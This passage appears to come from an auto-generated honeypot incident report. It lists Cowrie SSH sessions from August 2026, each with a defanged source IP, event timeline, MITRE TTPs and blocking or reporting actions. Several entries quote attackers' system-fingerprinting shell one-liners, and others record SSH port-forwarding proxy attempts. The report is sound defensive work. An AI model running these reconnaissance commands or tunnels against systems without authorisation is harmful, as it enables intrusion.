| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-30 13:25:46` | `cowrie.session.connect` |
| `2026-08-30 13:25:46` | `cowrie.client.version` |
| `2026-08-30 13:25:46` | `cowrie.client.kex` |
| `2026-08-30 13:25:47` | `cowrie.login.success` |
| `2026-08-30 13:25:48` | `cowrie.session.params` |
| `2026-08-30 13:25:48` | `cowrie.command.input` |
| `2026-08-30 13:25:48` | `cowrie.command.input` |
| `2026-08-30 13:25:48` | `cowrie.command.input` |
| `2026-08-30 13:25:48` | `cowrie.command.input` |
| `2026-08-30 13:25:48` | `cowrie.command.input` |
| `2026-08-30 13:25:48` | `cowrie.command.success` |
| `2026-08-30 13:25:48` | `cowrie.command.input` |
| `2026-08-30 13:25:48` | `cowrie.command.input` |
| `2026-08-30 13:25:48` | `cowrie.command.input` |
| `2026-08-30 13:25:48` | `cowrie.command.input` |
| `2026-08-30 13:25:48` | `cowrie.log.closed` |
| `2026-08-30 13:25:48` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `92.118.39[.]71` to AbuseIPDB if not already reported
- [ ] Block `92.118.39[.]71` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-833637ee7e1b

| Field | Detail |
|---|---|
| **Source IP** | `95.79.57[.]221` |
| **First Seen** | 2026-08-30 13:25 |
| **Last Seen** | 2026-08-30 13:25 |
| **Session Duration** | 6s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-30 13:25:52` | `cowrie.session.connect` |
| `2026-08-30 13:25:52` | `cowrie.client.version` |
| `2026-08-30 13:25:52` | `cowrie.client.kex` |
| `2026-08-30 13:25:53` | `cowrie.login.success` |
| `2026-08-30 13:25:53` | `cowrie.direct-tcpip.request` |
| `2026-08-30 13:25:58` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `95.79.57[.]221` to AbuseIPDB if not already reported
- [ ] Block `95.79.57[.]221` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-20c7a9c8248d

| Field | Detail |
|---|---|
| **Source IP** | `116.48.143[.]166` |
| **First Seen** | 2026-08-30 13:26 |
| **Last Seen** | 2026-08-30 13:26 |
| **Session Duration** | 14s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-30 13:26:01` | `cowrie.session.connect` |
| `2026-08-30 13:26:02` | `cowrie.client.version` |
| `2026-08-30 13:26:02` | `cowrie.client.kex` |
| `2026-08-30 13:26:08` | `cowrie.login.success` |
| `2026-08-30 13:26:10` | `cowrie.direct-tcpip.request` |
| `2026-08-30 13:26:15` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `116.48.143[.]166` to AbuseIPDB if not already reported
- [ ] Block `116.48.143[.]166` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-0cbb9fb1a98f

| Field | Detail |
|---|---|
| **Source IP** | `217.60.255[.]130` |
| **First Seen** | 2026-08-30 13:27 |
| **Last Seen** | 2026-08-30 13:27 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-30 13:27:21` | `cowrie.session.connect` |
| `2026-08-30 13:27:21` | `cowrie.client.version` |
| `2026-08-30 13:27:21` | `cowrie.client.kex` |
| `2026-08-30 13:27:22` | `cowrie.login.success` |
| `2026-08-30 13:27:22` | `cowrie.direct-tcpip.request` |
| `2026-08-30 13:27:22` | `cowrie.direct-tcpip.ja4h` |
| `2026-08-30 13:27:22` | `cowrie.direct-tcpip.data` |
| `2026-08-30 13:27:23` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `217.60.255[.]130` to AbuseIPDB if not already reported
- [ ] Block `217.60.255[.]130` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-5fb2080b7f6e

| Field | Detail |
|---|---|
| **Source IP** | `92.118.39[.]71` |
| **First Seen** | 2026-08-30 13:27 |
| **Last Seen** | 2026-08-30 13:27 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-30 13:27:37` | `cowrie.session.connect` |
| `2026-08-30 13:27:37` | `cowrie.client.version` |
| `2026-08-30 13:27:37` | `cowrie.client.kex` |
| `2026-08-30 13:27:38` | `cowrie.login.success` |
| `2026-08-30 13:27:39` | `cowrie.session.params` |
| `2026-08-30 13:27:39` | `cowrie.command.input` |
| `2026-08-30 13:27:39` | `cowrie.command.input` |
| `2026-08-30 13:27:39` | `cowrie.command.input` |
| `2026-08-30 13:27:39` | `cowrie.command.input` |
| `2026-08-30 13:27:39` | `cowrie.command.input` |
| `2026-08-30 13:27:39` | `cowrie.command.success` |
| `2026-08-30 13:27:39` | `cowrie.command.input` |
| `2026-08-30 13:27:39` | `cowrie.command.input` |
| `2026-08-30 13:27:39` | `cowrie.command.input` |
| `2026-08-30 13:27:39` | `cowrie.command.input` |
| `2026-08-30 13:27:39` | `cowrie.log.closed` |
| `2026-08-30 13:27:39` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `92.118.39[.]71` to AbuseIPDB if not already reported
- [ ] Block `92.118.39[.]71` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-e290b1b79461

| Field | Detail |
|---|---|
| **Source IP** | `2.57.122[.]53` |
| **First Seen** | 2026-08-30 13:27 |
| **Last Seen** | 2026-08-30 13:27 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `/bin/./uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-30 13:27:49` | `cowrie.session.connect` |
| `2026-08-30 13:27:49` | `cowrie.client.version` |
| `2026-08-30 13:27:49` | `cowrie.client.kex` |
| `2026-08-30 13:27:49` | `cowrie.login.success` |
| `2026-08-30 13:27:50` | `cowrie.session.params` |
| `2026-08-30 13:27:50` | `cowrie.command.input` |
| `2026-08-30 13:27:50` | `cowrie.log.closed` |
| `2026-08-30 13:27:50` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `2.57.122[.]53` to AbuseIPDB if not already reported
- [ ] Block `2.57.122[.]53` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-6b453712f289

| Field | Detail |
|---|---|
| **Source IP** | `217.60.255[.]130` |
| **First Seen** | 2026-08-30 13:28 |
| **Last Seen** | 2026-08-30 13:28 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-30 13:28:40` | `cowrie.session.connect` |
| `2026-08-30 13:28:40` | `cowrie.client.version` |
| `2026-08-30 13:28:40` | `cowrie.client.kex` |
| `2026-08-30 13:28:41` | `cowrie.login.success` |
| `2026-08-30 13:28:41` | `cowrie.direct-tcpip.request` |
| `2026-08-30 13:28:41` | `cowrie.direct-tcpip.ja4h` |
| `2026-08-30 13:28:41` | `cowrie.direct-tcpip.data` |
| `2026-08-30 13:28:41` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `217.60.255[.]130` to AbuseIPDB if not already reported
- [ ] Block `217.60.255[.]130` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-eb3b55db7888

| Field | Detail |
|---|---|
| **Source IP** | `92.118.39[.]71` |
| **First Seen** | 2026-08-30 13:29 |
| **Last Seen** | 2026-08-30 13:29 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-30 13:29:33` | `cowrie.session.connect` |
| `2026-08-30 13:29:34` | `cowrie.client.version` |
| `2026-08-30 13:29:34` | `cowrie.client.kex` |
| `2026-08-30 13:29:34` | `cowrie.login.success` |
| `2026-08-30 13:29:35` | `cowrie.session.params` |
| `2026-08-30 13:29:35` | `cowrie.command.input` |
| `2026-08-30 13:29:35` | `cowrie.command.input` |
| `2026-08-30 13:29:35` | `cowrie.command.input` |
| `2026-08-30 13:29:35` | `cowrie.command.input` |
| `2026-08-30 13:29:35` | `cowrie.command.input` |
| `2026-08-30 13:29:35` | `cowrie.command.success` |
| `2026-08-30 13:29:35` | `cowrie.command.input` |
| `2026-08-30 13:29:35` | `cowrie.command.input` |
| `2026-08-30 13:29:35` | `cowrie.command.input` |
| `2026-08-30 13:29:35` | `cowrie.command.input` |
| `2026-08-30 13:29:35` | `cowrie.log.closed` |
| `2026-08-30 13:29:36` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `92.118.39[.]71` to AbuseIPDB if not already reported
- [ ] Block `92.118.39[.]71` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-ba6ae3e390f2

| Field | Detail |
|---|---|
| **Source IP** | `2.57.122[.]53` |
| **First Seen** | 2026-08-30 13:30 |
| **Last Seen** | 2026-08-30 13:30 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `/bin/./uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-30 13:30:09` | `cowrie.session.connect` |
| `2026-08-30 13:30:09` | `cowrie.client.version` |
| `2026-08-30 13:30:09` | `cowrie.client.kex` |
| `2026-08-30 13:30:10` | `cowrie.login.success` |
| `2026-08-30 13:30:10` | `cowrie.session.params` |
| `2026-08-30 13:30:10` | `cowrie.command.input` |
| `2026-08-30 13:30:10` | `cowrie.log.closed` |
| `2026-08-30 13:30:10` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `2.57.122[.]53` to AbuseIPDB if not already reported
- [ ] Block `2.57.122[.]53` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-411eb8610577

| Field | Detail |
|---|---|
| **Source IP** | `92.118.39[.]71` |
| **First Seen** | 2026-08-30 13:31 |
| **Last Seen** | 2026-08-30 13:31 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-30 13:31:31` | `cowrie.session.connect` |
| `2026-08-30 13:31:31` | `cowrie.client.version` |
| `2026-08-30 13:31:31` | `cowrie.client.kex` |
| `2026-08-30 13:31:32` | `cowrie.login.success` |
| `2026-08-30 13:31:33` | `cowrie.session.params` |
| `2026-08-30 13:31:33` | `cowrie.command.input` |
| `2026-08-30 13:31:33` | `cowrie.command.input` |
| `2026-08-30 13:31:33` | `cowrie.command.input` |
| `2026-08-30 13:31:33` | `cowrie.command.input` |
| `2026-08-30 13:31:33` | `cowrie.command.input` |
| `2026-08-30 13:31:33` | `cowrie.command.success` |
| `2026-08-30 13:31:33` | `cowrie.command.input` |
| `2026-08-30 13:31:33` | `cowrie.command.input` |
| `2026-08-30 13:31:33` | `cowrie.command.input` |
| `2026-08-30 13:31:33` | `cowrie.command.input` |
| `2026-08-30 13:31:33` | `cowrie.log.closed` |
| `2026-08-30 13:31:33` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `92.118.39[.]71` to AbuseIPDB if not already reported
- [ ] Block `92.118.39[.]71` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-1adca0f8d567

| Field | Detail |
|---|---|
| **Source IP** | `2.57.122[.]53` |
| **First Seen** | 2026-08-30 13:32 |
| **Last Seen** | 2026-08-30 13:32 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `/bin/./uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-30 13:32:34` | `cowrie.session.connect` |
| `2026-08-30 13:32:34` | `cowrie.client.version` |
| `2026-08-30 13:32:34` | `cowrie.client.kex` |
| `2026-08-30 13:32:34` | `cowrie.login.success` |
| `2026-08-30 13:32:35` | `cowrie.session.params` |
| `2026-08-30 13:32:35` | `cowrie.command.input` |
| `2026-08-30 13:32:35` | `cowrie.log.closed` |
| `2026-08-30 13:32:35` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `2.57.122[.]53` to AbuseIPDB if not already reported
- [ ] Block `2.57.122[.]53` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-ba61fe67fff3

| Field | Detail |
|---|---|
| **Source IP** | `92.118.39[.]71` |
| **First Seen** | 2026-08-30 13:33 |
| **Last Seen** | 2026-08-30 13:33 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-30 13:33:19` | `cowrie.session.connect` |
| `2026-08-30 13:33:19` | `cowrie.client.version` |
| `2026-08-30 13:33:19` | `cowrie.client.kex` |
| `2026-08-30 13:33:21` | `cowrie.login.success` |
| `2026-08-30 13:33:23` | `cowrie.session.params` |
| `2026-08-30 13:33:23` | `cowrie.command.input` |
| `2026-08-30 13:33:23` | `cowrie.command.input` |
| `2026-08-30 13:33:23` | `cowrie.command.input` |
| `2026-08-30 13:33:23` | `cowrie.command.input` |
| `2026-08-30 13:33:23` | `cowrie.command.input` |
| `2026-08-30 13:33:23` | `cowrie.command.success` |
| `2026-08-30 13:33:23` | `cowrie.command.input` |
| `2026-08-30 13:33:23` | `cowrie.command.input` |
| `2026-08-30 13:33:23` | `cowrie.command.input` |
| `2026-08-30 13:33:23` | `cowrie.command.input` |
| `2026-08-30 13:33:23` | `cowrie.log.closed` |
| `2026-08-30 13:33:24` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `92.118.39[.]71` to AbuseIPDB if not already reported
- [ ] Block `92.118.39[.]71` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-f72c212ea88a

| Field | Detail |
|---|---|
| **Source IP** | `81.215.2[.]43` |
| **First Seen** | 2026-08-30 13:33 |
| **Last Seen** | 2026-08-30 13:33 |
| **Session Duration** | 6s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-30 13:33:36` | `cowrie.session.connect` |
| `2026-08-30 13:33:37` | `cowrie.client.version` |
| `2026-08-30 13:33:37` | `cowrie.client.kex` |
| `2026-08-30 13:33:38` | `cowrie.login.success` |
| `2026-08-30 13:33:39` | `cowrie.direct-tcpip.request` |
| `2026-08-30 13:33:43` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `81.215.2[.]43` to AbuseIPDB if not already reported
- [ ] Block `81.215.2[.]43` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-8716dc7a38b0

| Field | Detail |
|---|---|
| **Source IP** | `200.89.159[.]59` |
| **First Seen** | 2026-08-30 13:33 |
| **Last Seen** | 2026-08-30 13:33 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-30 13:33:44` | `cowrie.session.connect` |
| `2026-08-30 13:33:45` | `cowrie.client.version` |
| `2026-08-30 13:33:45` | `cowrie.client.kex` |
| `2026-08-30 13:33:46` | `cowrie.login.success` |
| `2026-08-30 13:33:47` | `cowrie.direct-tcpip.request` |
| `2026-08-30 13:33:51` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `200.89.159[.]59` to AbuseIPDB if not already reported
- [ ] Block `200.89.159[.]59` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-8c5485b0124e

| Field | Detail |
|---|---|
| **Source IP** | `2.57.122[.]53` |
| **First Seen** | 2026-08-30 13:34 |
| **Last Seen** | 2026-08-30 13:34 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `/bin/./uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-30 13:34:54` | `cowrie.session.connect` |
| `2026-08-30 13:34:54` | `cowrie.client.version` |
| `2026-08-30 13:34:54` | `cowrie.client.kex` |
| `2026-08-30 13:34:55` | `cowrie.login.success` |
| `2026-08-30 13:34:55` | `cowrie.session.params` |
| `2026-08-30 13:34:55` | `cowrie.command.input` |
| `2026-08-30 13:34:56` | `cowrie.log.closed` |
| `2026-08-30 13:34:56` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `2.57.122[.]53` to AbuseIPDB if not already reported
- [ ] Block `2.57.122[.]53` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-9f3a9b35ecd9

| Field | Detail |
|---|---|
| **Source IP** | `60.251.229[.]144` |
| **First Seen** | 2026-08-30 13:34 |
| **Last Seen** | 2026-08-30 13:35 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-30 13:34:57` | `cowrie.session.connect` |
| `2026-08-30 13:34:57` | `cowrie.client.version` |
| `2026-08-30 13:34:57` | `cowrie.client.kex` |
| `2026-08-30 13:34:59` | `cowrie.login.success` |
| `2026-08-30 13:35:00` | `cowrie.direct-tcpip.request` |
| `2026-08-30 13:35:05` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `60.251.229[.]144` to AbuseIPDB if not already reported
- [ ] Block `60.251.229[.]144` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-d1dd3c071289

| Field | Detail |
|---|---|
| **Source IP** | `92.118.39[.]71` |
| **First Seen** | 2026-08-30 13:34 |
| **Last Seen** | 2026-08-30 13:35 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-30 13:34:57` | `cowrie.session.connect` |
| `2026-08-30 13:34:57` | `cowrie.client.version` |
| `2026-08-30 13:34:57` | `cowrie.client.kex` |
| `2026-08-30 13:34:59` | `cowrie.login.success` |
| `2026-08-30 13:35:00` | `cowrie.session.params` |
| `2026-08-30 13:35:00` | `cowrie.command.input` |
| `2026-08-30 13:35:00` | `cowrie.command.input` |
| `2026-08-30 13:35:00` | `cowrie.command.input` |
| `2026-08-30 13:35:00` | `cowrie.command.input` |
| `2026-08-30 13:35:00` | `cowrie.command.input` |
| `2026-08-30 13:35:00` | `cowrie.command.success` |
| `2026-08-30 13:35:00` | `cowrie.command.input` |
| `2026-08-30 13:35:00` | `cowrie.command.input` |
| `2026-08-30 13:35:00` | `cowrie.command.input` |
| `2026-08-30 13:35:00` | `cowrie.command.input` |
| `2026-08-30 13:35:00` | `cowrie.log.closed` |
| `2026-08-30 13:35:01` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `92.118.39[.]71` to AbuseIPDB if not already reported
- [ ] Block `92.118.39[.]71` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-af0df59cb391

| Field | Detail |
|---|---|
| **Source IP** | `187.49.63[.]41` |
| **First Seen** | 2026-08-30 13:35 |
| **Last Seen** | 2026-08-30 13:35 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-30 13:35:04` | `cowrie.session.connect` |
| `2026-08-30 13:35:05` | `cowrie.client.version` |
| `2026-08-30 13:35:05` | `cowrie.client.kex` |
| `2026-08-30 13:35:07` | `cowrie.login.success` |
| `2026-08-30 13:35:07` | `cowrie.direct-tcpip.request` |
| `2026-08-30 13:35:12` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `187.49.63[.]41` to AbuseIPDB if not already reported
- [ ] Block `187.49.63[.]41` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-d6af6abbe5b8

| Field | Detail |
|---|---|
| **Source IP** | `39.164.91[.]67` |
| **First Seen** | 2026-08-30 13:35 |
| **Last Seen** | 2026-08-30 13:35 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-30 13:35:13` | `cowrie.session.connect` |
| `2026-08-30 13:35:13` | `cowrie.client.version` |
| `2026-08-30 13:35:13` | `cowrie.client.kex` |
| `2026-08-30 13:35:16` | `cowrie.login.success` |
| `2026-08-30 13:35:17` | `cowrie.direct-tcpip.request` |
| `2026-08-30 13:35:21` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `39.164.91[.]67` to AbuseIPDB if not already reported
- [ ] Block `39.164.91[.]67` at perimeter firewall / security group
